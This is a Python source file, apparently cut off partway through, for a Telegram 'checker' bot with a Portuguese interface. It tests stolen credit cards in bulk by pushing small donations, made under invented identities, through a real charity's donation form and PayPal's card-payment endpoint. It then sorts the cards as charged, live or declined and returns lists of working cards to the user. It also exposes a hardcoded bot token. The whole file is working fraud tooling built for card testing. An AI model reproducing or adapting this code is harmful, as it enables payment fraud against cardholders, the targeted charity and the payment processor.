import requests
import re
import time
import telebot
import random 
import threading
import queue
import os
import tempfile
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor, as_completed

# Listas de nomes
nomes = ["Liam", "Noah", "Oliver", "Elijah", "James", "William", "Benjamin", "Lucas", "Henry", 
         "Alexander", "Michael", "Daniel", "Matthew", "Joseph", "David", "Samuel", "John", "Ethan",
         "Jacob", "Logan", "Jackson", "Sebastian", "Jack", "Aiden", "Owen", "Leo", "Wyatt", "Jayden",
         "Gabriel", "Carter", "Luke", "Grayson", "Isaac", "Lincoln", "Mason", "Theodore", "Ryan",
         "Nathan", "Andrew", "Joshua", "Thomas", "Charles", "Caleb", "Christian", "Hunter", "Jonathan",
         "Eli", "Aaron", "Connor", "Isaiah", "Jaxon", "Nicholas", "Adrian", "Cameron", "Jordan",
         "Brayden", "Dominic", "Austin", "Ian", "Adam", "Elias", "Jose", "Anthony", "Colton", "Chase",
         "Jason", "Zachary", "Xavier", "Christopher", "Jace", "Cooper", "Kevin", "Nolan", "Parker",
         "Miles", "Asher", "Ryder", "Roman", "Evan", "Greyson", "Josiah", "Axel", "Wesley", "Leonardo",
         "Santiago", "Kayden", "Brandon", "Everett", "Rowan", "Micah", "Vincent", "Tyler", "Maximus",
         "Amir", "Kingston", "Justin", "Silas", "Declan", "Luca", "Carlos", "Max", "Diego", "Damian",
         "Harrison", "Brantley", "Brody", "George", "Maverick", "Braxton", "Jonah", "Timothy", "Jude"]

apelidos = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez",
            "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Thompson",
            "White", "Lee", "Perez", "Harris", "Clark", "Lewis", "Robinson", "Walker", "Young", "Allen",
            "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green", "Adams", "Nelson",
            "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts", "Gomez", "Phillips",
            "Evans", "Turner", "Diaz", "Parker", "Cruz", "Edwards", "Collins", "Reyes", "Stewart", "Morris",
            "Morales", "Murphy", "Cook", "Rogers", "Gutierrez", "Ortiz", "Morgan", "Cooper", "Peterson",
            "Bailey", "Reed", "Kelly", "Howard", "Ramos", "Kim", "Cox", "Ward", "Richardson", "Watson",
            "Brooks", "Chavez", "Wood", "James", "Bennett", "Gray", "Mendoza", "Ruiz", "Hughes", "Price",
            "Alvarez", "Castillo", "Sanders", "Patel", "Myers", "Long", "Ross", "Foster", "Jimenez",
            "Powell", "Jenkins", "Perry", "Russell", "Sullivan", "Bell", "Coleman", "Butler", "Henderson",
            "Barnes", "Gonzales", "Fisher", "Vasquez", "Simmons", "Romero", "Jordan", "Patterson", "Alexander"]

bot = telebot.TeleBot('8205483485:AAG5QnSBtcM5EZG4BF3hARuWm-Fb9rQUUpQ')

# Configuração de threads - AGORA FUNCIONA DE VERDADE!
max_threads = 5

def clean_text(text):
    """Remove todos caracteres que podem quebrar HTML ou causar erros"""
    if not text:
        return "Verificacao"
    
    # Remover caracteres especiais problemáticos
    replacements = {
        '<': '', '>': '', '&': 'e', '"': '', "'": '',
        '`': '', '~': '', '|': '', '\\': '', '/': ' ',
        '{': '', '}': '', '[': '', ']': '', '(': '', ')': '',
        '*': '', '+': '', '=': '', '^': '', '%': '',
        '$': '', '#': '', '@': '', '!': '', '?': '',
        ';': '', ':': ' ', ',': '', '.': ' ', 
        'ㅤ': ' ',  # Caractere coreano
        '\u200b': ' ', '\u200c': ' ', '\u200d': ' ',  # Caracteres de largura zero
        '\u202e': ' ', '\u202d': ' ',  # Caracteres RTL
    }
    
    for char, replacement in replacements.items():
        text = text.replace(char, replacement)
    
    # Remover emojis e caracteres não ASCII
    text = re.sub(r'[^\x00-\x7F]+', ' ', text)
    
    # Remover múltiplos espaços
    text = ' '.join(text.split())
    
    # Limitar tamanho
    return text[:30].strip()

def reg(card_details):
    pattern = r'(\d{16}\|\d{1,2}\|\d{2,4}\|\d{3})'
    match = re.search(pattern, card_details)
    if match:
        return match.group(1)
    return 'None'

def get_bin_info(bin_number):
    try:
        data = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=3).json()
        return data
    except:
        return {}

def format_year(yy):
    """Formata o ano para 4 dígitos (ex: 26 -> 2026, 2026 -> 2026)"""
    yy = str(yy).strip()
    if len(yy) == 2:
        return f"20{yy}"
    elif len(yy) == 4:
        return yy
    else:
        return yy

def brn6(ccx):
    """Função principal de verificação de cartão - OTIMIZADA"""
    ccx = ccx.strip()
    parts = ccx.split("|")
    
    if len(parts) != 4:
        return f"DECLINED ❌|Invalid card format"
    
    cc = parts[0]
    mm = parts[1]
    yy_raw = parts[2]
    cvv = parts[3]
    
    # Formata o ano para 4 dígitos
    yy = format_year(yy_raw)
    
    r = requests.Session()
    # Configurar timeout para evitar travamentos
    r.request = lambda method, url, **kwargs: requests.Session.request(r, method, url, timeout=6, **kwargs)  # Reduzido para 6s
    
    # Códigos postais de NY Manhattan
    codigos_postais_ny_manhattan = [
        '10001', '10002', '10003', '10004', '10005', '10006', '10007', '10009', '10010',
        '10011', '10012', '10013', '10014', '10016', '10017', '10018', '10019', '10021',
        '10022', '10023', '10024', '10025', '10026', '10027', '10028', '10029', '10031',
        '10032', '10033', '10034', '10035'
    ]
    
    try:
        # Sorteia dados
        nome = random.choice(nomes)
        apelido = random.choice(apelidos)
        postal = random.choice(codigos_postais_ny_manhattan)
        numero = f"201{random.randint(0, 9999999):07d}"
        email = f"{nome.lower()}{apelido.lower()}{random.randint(10,999)}@gmail.com"
        
        headers = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        # Primeira requisição
        response = r.get('https://www.brightercommunities.org/donate-form/', cookies=r.cookies, headers=headers)

        data = {
            'action': 'give_donation_form_reset_all_nonce',
            'give_form_id': '1938',
        }

        relf = r.post(
            'https://www.brightercommunities.org/wp-admin/admin-ajax.php',
            cookies=r.cookies,
            headers=headers,
            data=data,
        ).text

        hash = re.search('"give_form_hash":"(.*?)"', relf).group(1)

        files = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, '1938-1'),
            'give-form-id': (None, '1938'),
            'give-form-title': (None, 'Donation Form'),
            'give-current-url': (None, 'https://www.brightercommunities.org/donate-form/'),
            'give-form-url': (None, 'https://www.brightercommunities.org/donate-form/'),
            'give-form-minimum': (None, '5.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, hash),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '5.00'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, nome),
            'give_last': (None, apelido),
            'give_email': (None, email),
            'give_action': (None, 'purchase'),
            'give-gateway': (None, 'paypal-commerce'),
            'action': (None, 'give_process_donation'),
            'give_ajax': (None, 'true'),
        }

        response = r.post(
            'https://www.brightercommunities.org/wp-admin/admin-ajax.php',
            cookies=r.cookies,
            headers=headers,
            files=files,
        )
        time.sleep(0.2)  # REDUZIDO de 0.5 para 0.2
        
        # Segundo POST para criar order
        params = {
            'action': 'give_paypal_commerce_create_order',
        }

        files = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, '1938-1'),
            'give-form-id': (None, '1938'),
            'give-form-title': (None, 'Donation Form'),
            'give-current-url': (None, 'https://www.brightercommunities.org/donate-form/'),
            'give-form-url': (None, 'https://www.brightercommunities.org/donate-form/'),
            'give-form-minimum': (None, '5.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, hash),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '5.00'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, nome),
            'give_last': (None, apelido),
            'give_email': (None, email),
            'give-gateway': (None, 'paypal-commerce'),
        }

        response = r.post(
            'https://www.brightercommunities.org/wp-admin/admin-ajax.php',
            params=params,
            cookies=r.cookies,
            headers=headers,
            files=files,
        )

        # Extrai ID da resposta
        id_value = response.json()['data']['id']
        time.sleep(0.5)  # REDUZIDO de 1 para 0.5 segundos
        
        # GraphQL request
        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': id_value,
                'card': {
                    'cardNumber': cc,
                    'type': 'MASTER_CARD',
                    'expirationDate': f'{mm}/{yy}',
                    'postalCode': postal,
                    'securityCode': cvv,
                },
                'phoneNumber': numero,
                'firstName': nome,
                'lastName': apelido,
                'billingAddress': {
                    'givenName': nome,
                    'familyName': apelido,
                    'state': 'NY',
                    'country': 'US',
                    'line1': '47W 13th street ',
                    'city': 'New York ',
                    'postalCode': postal,
                },
                'shippingAddress': {
                    'givenName': nome,
                    'familyName': apelido,
                    'state': 'NY',
                    'country': 'US',
                    'line1': '47W 13th street ',
                    'city': 'New York ',
                    'postalCode': postal,
                },
                'email': email,
                'currencyConversionType': 'PAYPAL',
            },
            'operationName': None,
        }

        response = r.post(
            'https://www.paypal.com/graphql?fetch_credit_form_submit',
            cookies=r.cookies,
            headers=headers,
            json=json_data,
        )
        
        last = response.text
        
        # LÓGICA DE RESPOSTAS ESPECÍFICAS
        if ('ADD_SHIPPING_ERROR' in last or 'NEED_CREDIT_CARD' in last or '"status": "succeeded"' in last or 
            'Thank You For Donation.' in last or 'Your payment has already been processed' in last or 'Success ' in last):
            return 'CHARGE 2$ ✅|Charged successfully'
        elif 'is3DSecureRequired' in last or 'OTP' in last:
            return 'Approve ❎|3DS Required'
        elif 'INVALID_SECURITY_CODE' in last:
            return 'APPROVED CCN ✅|CCN Live'
        elif 'INVALID_BILLING_ADDRESS' in last:
            return 'APPROVED - AVS ✅|AVS Live'
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            return 'APPROVED ✅|Approved'
        else:
            try:
                response_json = response.json()
                if 'errors' in response_json and len(response_json['errors']) > 0:
                    message = response_json['errors'][0].get('message', 'Unknown error')
                    if 'data' in response_json['errors'][0] and len(response_json['errors'][0]['data']) > 0:
                        code = response_json['errors'][0]['data'][0].get('code', 'NO_CODE')
                        return f'DECLINED ❌|{code}'
                    return f'DECLINED ❌|{message}'
                return f'DECLINED ❌|{response.text[:100] if hasattr(response, "text") else "Unknown error"}'
            except Exception as e:
                return f'DECLINED ❌|{response.text[:100] if hasattr(response, "text") else "Unknown error"}'
                
    except requests.exceptions.Timeout:
        return "DECLINED ❌|Request timeout"
    except Exception as e:
        return f"DECLINED ❌|{str(e)}"

def format_result_line(cc, result_raw, bin_info, elapsed, username="Mass Check", index=0):
    """Formata uma linha de resultado para o arquivo TXT - COM ORDEM NUMERADA"""
    if "|" in result_raw:
        status_full, response_msg = result_raw.split("|", 1)
    else:
        status_full = result_raw
        response_msg = result_raw
    
    # Extrair informações do BIN
    brand = bin_info.get('brand', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', '🇺🇸')
    
    # Determinar o status principal
    if 'CHARGE 2$ ✅' in status_full:
        status_main = "Charged 🔥"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {status_full} / {status_main}"
    elif 'Approve ❎' in status_full:
        status_main = "3DS Required"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {status_full} / {status_main}"
    elif 'APPROVED CCN ✅' in status_full:
        status_main = "CCN Live"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {status_full} / {status_main}"
    elif 'APPROVED - AVS ✅' in status_full:
        status_main = "AVS Live"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {status_full} / {status_main}"
    elif 'APPROVED ✅' in status_full:
        status_main = "Approved"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {status_full} / {status_main}"
    elif 'DECLINED ❌' in status_full:
        status_main = "Declined"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {status_full} / {status_main}"
    else:
        status_main = "Unknown"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {status_full} / {status_main}"
    
    # Formatar linha completa COM NÚMERO DE ORDEM
    return f"""#{index+1:03d} {status_line}

⊀ 𝐂𝐚𝐫𝐝
⤷ {cc}
⊀ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙋𝙖𝙮𝙥𝙖𝙡 𝟭0$
⊀ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ {response_msg}
𝐁𝐫𝐚𝐧𝐝 ➵ {brand}
𝐁𝐚𝐧𝐤 ➵ {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {country} {country_flag}
⌬ 𝐔𝐬𝐞𝐫 ➵ {username}
⌥ 𝐃𝐄𝐕 ➵ @Lorde_Pc
⌬ 𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed:.2f}s

"""

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    menu_text = f'''𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ] 
    
🤖 Comandos Disponíveis:

🔄 Verificação Simples
→ /pp [cartão] - Verificar um cartão
→ Responda um cartão com /pp

📁 Verificação em Massa  
→ /mpp [cartões] - Verificar múltiplos cartões
→ Responda lista de cartões com /mpp

📄 Verificação por Arquivo
→ Envie um arquivo .txt com cartões

⚡ Configuração de Threads
→ /thread [1-15] - Ajustar threads
→ Threads atuais: {max_threads} (AGORA FUNCIONAM!)

📊 Status
→ /status - Verificar status do bot

🔧 Desenvolvedor
→ @Lorde_Pc

💬 Suporte
→ Contate para dúvidas'''
    
    bot.reply_to(message, menu_text)

@bot.message_handler(commands=['status'])
def check_status(message):
    status_text = f'''𝘾 𝙃 𝙆 𝕏 [ 𝙎 𝙏 𝘼 𝙏 𝙐 𝙎 ]

⚡ Status do Bot:

✅ Bot: Online & Rodando
🔁 Threads: {max_threads} (PARALELO!)
🔄 Gateway: PayPal 10$
📊 Versão: 4.0 (Threads Reais + Ordem)
👨‍💻 Desenvolvedor: @Lorde_Pc
🕒 Tempo Ativo: Online
⚡ Velocidade: ~3-5s/cartão'''
    
    bot.reply_to(message, status_text)

@bot.message_handler(commands=['thread'])
def set_threads(message):
    global max_threads
    try:
        args = message.text.split()
        if len(args) > 1:
            new_threads = int(args[1])
            if 1 <= new_threads <= 15:
                max_threads = new_threads
                bot.reply_to(message, f"✅ Threads atualizados para: {max_threads}")
                print(f"Threads atualizados para: {max_threads}")
            else:
                bot.reply_to(message, "❌ Por favor, insira um número entre 1 e 15")
        else:
            bot.reply_to(message, f"📊 Threads atuais: {max_threads}\nUse: /thread [1-15]")
    except ValueError:
        bot.reply_to(message, "❌ Formato de número inválido")

@bot.message_handler(func=lambda message: message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp'))
def respond_to_pp(message):
    gate = '𝙋𝙖𝙮𝙥𝙖𝙡 𝟭0$'
    ko = bot.reply_to(message, "🔍 Verificando Seu Cartão...")
    
    if isinstance(ko, types.Message):
        ko_message_id = ko.message_id
    else:
        ko_message_id = ko
    
    cc = message.reply_to_message.text if message.reply_to_message else message.text
    cc = str(reg(cc))
    
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko_message_id, 
                             text='''❌ Formato Inválido!
Por favor use: /pp [cartão]
Formato: 5598880399683715|12|2026|602''')
        return

    start_time = time.time()
    result = brn6(cc)
    
    # Processar resultado
    if "|" in result:
        last, response_message = result.split("|", 1)
    else:
        last = result
        response_message = result
    
    # Obter informações do BIN
    bin_info = get_bin_info(cc[:6])
    brand = bin_info.get('brand', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', '🇺🇸')
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Obter nome do usuário
    user_name = message.from_user.first_name or "Usuário"
    if message.from_user.last_name:
        user_name += f" {message.from_user.last_name}"
    
    safe_username = clean_text(user_name)
    
    # Determinar o status principal
    if 'CHARGE 2$ ✅' in last:
        status_main = "Charged 🔥"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    elif 'Approve ❎' in last:
        status_main = "3DS Required"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    elif 'APPROVED CCN ✅' in last:
        status_main = "CCN Live"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    elif 'APPROVED - AVS ✅' in last:
        status_main = "AVS Live"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    elif 'APPROVED ✅' in last:
        status_main = "Approved"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    elif 'DECLINED ❌' in last:
        status_main = "Declined"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    else:
        status_main = "Unknown"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    
    # Formatar mensagem
    msg = f'''{status_line}

⊀ 𝐂𝐚𝐫𝐝
⤷ {cc}
⊀ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ {gate}
⊀ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ {response_message}
𝐁𝐫𝐚𝐧𝐝 ➵ {brand}
𝐁𝐚𝐧𝐤 ➵ {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {country} {country_flag}
⌬ 𝐔𝐬𝐞𝐫 ➵ {safe_username}
⌥ 𝐃𝐄𝐕 ➵ @Lorde_Pc
⌬ 𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {execution_time:.2f}s'''
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko_message_id, text=msg)

def process_cc_list(chat_id, cc_list, source_name="Verificação em Massa"):
    """Processa uma lista de cartões com THREADS REAIS e ordem crescente"""
    gate = '𝙋𝙖𝙮𝙥𝙖𝙡 𝟭0$'
    
    # Limpar nome da fonte
    safe_source = clean_text(source_name)
    
    # Mensagem inicial
    init_msg = bot.send_message(
        chat_id, 
        f"⚡ Iniciando verificação PARALELA...\n"
        f"📄 Fonte: {safe_source}\n"
        f"🗂️ Total: {len(cc_list)} cartões\n"
        f"🧵 Threads: {max_threads}\n"
        f"⏱️ Estimado: ~{len(cc_list)/max_threads*4:.1f}s\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    
    # Listas para resultados - AGORA COM ÍNDICE PARA ORDEM
    results_by_index = {}  # Guarda resultados por índice
    results_lock = threading.Lock()
    
    # Contadores
    completed_count = 0
    approved_charged = []
    approved_ccn = []
    approved_avs = []
    approved_3ds = []
    approved_regular = []
    declined_list = []
    
    last_update_time = time.time()
    start_time = time.time()
    
    def process_card_with_index(card_index, cc):
        """Processa um cartão e guarda resultado com índice"""
        nonlocal completed_count, approved_charged, approved_ccn, approved_avs
        nonlocal approved_3ds, approved_regular, declined_list
        
        card_start = time.time()
        result_raw = brn6(cc)
        elapsed = time.time() - card_start
        
        # Obter informações do BIN
        bin_info = get_bin_info(cc[:6])
        
        with results_lock:
            # Guardar resultado com índice
            results_by_index[card_index] = {
                'cc': cc,
                'result': result_raw,
                'bin_info': bin_info,
                'elapsed': elapsed,
                'processed': True
            }
            
            completed_count += 1
            
            # Classificar para contagem
            if 'CHARGE 2$ ✅' in result_raw:
                approved_charged.append(cc)
            elif 'APPROVED CCN ✅' in result_raw:
                approved_ccn.append(cc)
            elif 'APPROVED - AVS ✅' in result_raw:
                approved_avs.append(cc)
            elif 'Approve ❎' in result_raw:
                approved_3ds.append(cc)
            elif 'APPROVED ✅' in result_raw:
                approved_regular.append(cc)
            elif 'DECLINED ❌' in result_raw:
                declined_list.append(cc)
            
            return card_index
    
    # USAR ThreadPoolExecutor PARA THREADS REAIS
    print(f"🚀 Iniciando {len(cc_list)} cartões com {max_threads} threads...")
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        # Enviar todos os cartões para processamento
        future_to_index = {
            executor.submit(process_card_with_index, idx, cc): idx 
            for idx, cc in enumerate(cc_list)
        }
        
        # Monitorar progresso enquanto processa
        total_cards = len(cc_list)
        
        while completed_count < total_cards:
            time.sleep(0.5)  # Verifica a cada 0.5 segundos
            
            current_time = time.time()
            if current_time - last_update_time > 1.5:  # Atualiza a cada 1.5s
                with results_lock:
                    total_approved = (len(approved_charged) + len(approved_ccn) + 
                                    len(approved_avs) + len(approved_3ds) + len(approved_regular))
                    
                    progress_percent = int((completed_count / total_cards) * 100)
                    progress_bar = "[" + "■" * (progress_percent // 10) + "□" * (10 - (progress_percent // 10)) + "]"
                    
                    # Calcular velocidade média
                    elapsed_total = current_time - start_time
                    speed = completed_count / elapsed_total if elapsed_total > 0 else 0
                    
                    progress_msg = f"""⚡ Verificação PARALELA {progress_bar}

🗂️ Total: {total_cards} | ✅ Aprovados: {total_approved} | ❌ Recusados: {len(declined_list)}
📊 Progresso: {completed_count}/{total_cards} ({progress_percent}%)
⚡ Velocidade: {speed:.1f} cartões/segundo
🧵 Threads Ativas: {max_threads}
⏱️ Tempo: {elapsed_total:.1f}s
━━━━━━━━━━━━━━━━━━━━"""
                    
                    try:
                        bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=init_msg.message_id,
                            text=progress_msg
                        )
                    except:
                        pass
                    
                    last_update_time = current_time
    
    # Aguardar conclusão de todas as threads
    print("✅ Todas as threads concluídas!")
    
    # ORDENAR RESULTADOS POR ÍNDICE (CRESCENTE)
    ordered_results = []
    for i in range(len(cc_list)):
        if i in results_by_index:
            data = results_by_index[i]
            ordered_results.append(format_result_line(
                data['cc'], 
                data['result'], 
                data['bin_info'], 
                data['elapsed'], 
                safe_source,
                i  # Passa o índice para numeração
            ))
    
    total_time = time.time() - start_time
    total_approved = len(approved_charged) + len(approved_ccn) + len(approved_avs) + len(approved_3ds) + len(approved_regular)
    
    # Criar arquivo TXT com resultados
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8')
    
    # Cabeçalho do arquivo
    temp_file.write(f"""╔══════════════════════════════════════════════╗
║  𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ] - RESULTADOS PARALELOS  ║
╠══════════════════════════════════════════════╣
║ 📅 Data/Hora: {datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
║ 📄 Fonte: {safe_source}
║ 🗂️ Total de Cartões: {len(cc_list)}
║ ⚡ Gateway: {gate}
║ 🧵 Threads Usados: {max_threads}
║ ⏱️ Tempo Total: {total_time:.1f}s
║ ⚡ Velocidade: {len(cc_list)/total_time:.2f} cartões/s
╚══════════════════════════════════════════════╝

""")
    
    # Seção de APROVADOS
    if total_approved > 0:
        temp_file.write(f"═══════════════ ✅ APROVADOS ({total_approved}) ═══════════════\n\n")
        
        # Charged
        if approved_charged:
            temp_file.write(f"🔥 CHARGED ({len(approved_charged)}):\n")
            for i, cc in enumerate(approved_charged, 1):
                temp_file.write(f"  {i:2d}. {cc}\n")
            temp_file.write("\n")
        
        # CCN
        if approved_ccn:
            temp_file.write(f"💳 CCN LIVE ({len(approved_ccn)}):\n")
            for i, cc in enumerate(approved_ccn, 1):
                temp_file.write(f"  {i:2d}. {cc}\n")
            temp_file.write("\n")
        
        # AVS
        if approved_avs:
            temp_file.write(f"📍 AVS LIVE ({len(approved_avs)}):\n")
            for i, cc in enumerate(approved_avs, 1):
                temp_file.write(f"  {i:2d}. {cc}\n")
            temp_file.write("\n")
        
        # 3DS
        if approved_3ds:
            temp_file.write(f"❎ 3DS REQUIRED ({len(approved_3ds)}):\n")
            for i, cc in enumerate(approved_3ds, 1):
                temp_file.write(f"  {i:2d}. {cc}\n")
            temp_file.write("\n")
        
        # Aprovados regulares
        if approved_regular:
            temp_file.write(f"✅ APPROVED ({len(approved_regular)}):\n")
            for i, cc in enumerate(approved_regular, 1):
                temp_file.write(f"  {i:2d}. {cc}\n")
            temp_file.write("\n")
    
    # Seção de RECUSADOS
    if declined_list:
        temp_file.write(f"═══════════════ ❌ RECUSADOS ({len(declined_list)}) ═══════════════\n\n")
        for i, cc in enumerate(declined_list, 1):
            temp_file.write(f"  {i:2d}. {cc}\n")
        temp_file.write("\n")
    
    # Resultados detalhados EM ORDEM CRESCENTE
    temp_file.write(f"═══════════════ 📋 RESULTADOS DETALHADOS (ORDEM ORIGINAL) ═══════════════\n\n")
    for result in ordered_results:  # JÁ ESTÁ ORDENADO!
        temp_file.write(result)
    
    temp_file.close()
    
    # Resumo final
    summary_msg = f"""📊 VERIFICAÇÃO PARALELA CONCLUÍDA ✅
━━━━━━━━━━━━━━━━━━━━
🗂️ Total de Cartões: {len(cc_list)}
⏱️ Tempo Total: {total_time:.1f}s
⚡ Velocidade: {len(cc_list)/total_time:.2f} cartões/segundo
━━━━━━━━━━━━━━━━━━━━
✅ APROVADOS: {total_approved}
  ├─ 🔥 Charged: {len(approved_charged)}
  ├─ 💳 CCN Live: {len(approved_ccn)}
  ├─ 📍 AVS Live: {len(approved_avs)}
  ├─ ❎ 3DS Required: {len(approved_3ds)}
  └─ ✅ Approved: {len(approved_regular)}
❌ DECLINED: {len(declined_list)}
━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: {gate}
🧵 Threads: {max_threads}
📄 Arquivo com resultados ENVIADO ABAIXO!
━━━━━━━━━━━━━━━━━━━━
📍 Resultados em ORDEM CRESCENTE: #001, #002, #003..."""
    
    try:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=init_msg.message_id,
            text=summary_msg
        )
    except:
        pass
    
    # Enviar arquivo
    try:
        with open(temp_file.name, 'rb') as file:
            bot.send_document(
                chat_id=chat_id,
                document=file,
                caption=f"📄 Resultados PARALELOS\n"
                       f"🗂️ Total: {len(cc_list)} cartões\n"
                       f"⏱️ Tempo: {total_time:.1f}s\n"
                       f"⚡ Velocidade: {len(cc_list)/total_time:.2f}/s\n"
                       f"✅ Aprovados: {total_approved}\n"
                       f"❌ Recusados: {len(declined_list)}\n"
                       f"🧵 Threads: {max_threads}"
            )
    except Exception as e:
        bot.send_message(chat_id, f"❌ Erro ao enviar arquivo: {str(e)}")
    
    # Limpar arquivo temporário
    try:
        os.unlink(temp_file.name)
    except:
        pass
    
    print(f"✅ Processamento concluído: {len(cc_list)} cartões em {total_time:.1f}s "
          f"({len(cc_list)/total_time:.2f}/s), {total_approved} aprovados")

@bot.message_handler(commands=['mpp'])
def mass_check(message):
    chat_id = message.chat.id
    
    # Pegar texto
    if message.reply_to_message:
        cc_text = message.reply_to_message.text
    else:
